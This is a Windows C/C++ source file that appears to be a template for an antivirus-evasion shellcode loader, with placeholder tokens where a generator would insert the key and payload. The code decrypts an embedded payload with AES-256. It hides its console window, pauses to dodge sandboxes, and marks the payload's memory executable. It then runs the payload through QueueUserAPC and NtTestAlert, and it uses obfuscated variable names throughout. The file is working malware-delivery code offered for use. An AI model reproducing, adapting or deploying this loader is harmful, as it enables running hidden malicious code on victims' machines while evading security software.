#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment(lib, "ntdll")

using Random6 = NTSTATUS(NTAPI*)();

static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");

static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");

unsigned char sntdll[] = {'n','t','d','l','l', 0x0};
unsigned char sNtA[] = {'N','t','T','e','s','t','A','l','e','r','t', 0x0 };

static void SleepShort(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}

int Random1(char * Random3, unsigned int Random3_len, char * Random2, int Random2len) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) Random2, (DWORD) Random2len, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) Random3, (DWORD *) &Random3_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int main()
{
	DWORD oldprotect = 0;
	char Random2[]=KEYVALUE
	unsigned char Random3[]=PAYVAL

	unsigned int Random3_len = sizeof(Random3);
        
      
	FreeConsole();
	Random6 Random7 = (Random6)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
	SIZE_T Random4 = sizeof(Random3);
	
	Random1((char *) Random3, Random3_len, Random2, sizeof(Random2));
	
	LPVOID Random5 = VirtualAlloc(NULL, Random4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	SleepShort(3000);
	
	//WriteProcessMemory(GetCurrentProcess(), Random5, Random3, Random4, NULL);
	RtlCopyMemory(Random5, Random3, Random3_len);
	
	VirtualProtect(Random5, Random3_len, PAGE_EXECUTE_READ, &oldprotect);
	

	PTHREAD_START_ROUTINE Random8 = (PTHREAD_START_ROUTINE)Random5;
	QueueUserAPC((PAPCFUNC)Random8, GetCurrentThread(), NULL);
	Random7();

	return 0;
}
